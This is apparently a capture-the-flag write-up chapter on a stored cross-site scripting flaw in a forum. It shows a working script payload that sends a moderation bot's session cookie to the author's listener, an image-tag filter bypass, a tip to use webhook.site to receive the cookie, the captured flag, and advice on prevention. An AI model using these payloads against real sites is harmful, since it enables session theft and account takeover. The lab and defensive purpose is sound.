## Chapter 5 — Stored XSS
#stored-xss #xss #httponly #cookie-theft

The forum saves my post and shows it as raw HTML — it does not clean my input. So I can put a `<script>` in a post, and it runs in the browser of anyone who opens that post.

The forum even says: "Every new post is opened by our automated moderation bot for review." That means a **privileged bot will open my post and run my script** — I don't need to trick a human.

**The exploit (automated in `exploit.sh`):**
1. The script auto-detects my machine's IP and starts a listener on it (`http://<my-ip>:8000`).
2. It logs in as jdoe and posts this to `/forum/new` (content field):
   `<script>new Image().src="http://<my-ip>:8000/steal?c="+encodeURIComponent(document.cookie)</script>`
3. Within ~1 minute, the bot opens my post, runs my script, and sends its cookie to my listener.
4. The cookie carries the flag:
   `session=...(moderator)...; flag=FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`
	`🚩🚩🚩 FLAG{xss_st0r3d_1s_n0t_4_f34tur3_w1l}`

**Why the cookie could be stolen:** the session cookie is `httponly=false`, so JavaScript can read it with `document.cookie`. If it were `HttpOnly`, my script could run but could not read the cookie.

### Two things I learned

- The forum LIST view strips `<script>`, but the bot opens the single POST page, where it runs. Always test the exact page the victim loads. If `<script>` is blocked, `<img src=x onerror="...">` bypasses it.
- The listener must use my **real IP**, not `localhost`. The bot's `localhost` is the bot's own machine, not mine — with `localhost` I only caught my own cookie. Using my machine's IP (or a public URL like webhook.site) fixes this, because the bot can reach it. The bot must be able to route to my IP (depends on the VM network mode; if not, webhook.site always works).

### Impact

Any user (or the privileged bot) who opens my post has their session stolen. With the stolen cookie, I can log in as them — full account takeover, with no password needed.

### Prevention

- Clean user input before showing it: escape HTML, or use an allowlist sanitizer (like bleach). Never render raw user HTML.
- Set the session cookie to `HttpOnly=true`, so JavaScript cannot read it.
- Add a strict Content-Security-Policy to block inline scripts and unknown fetch destinations.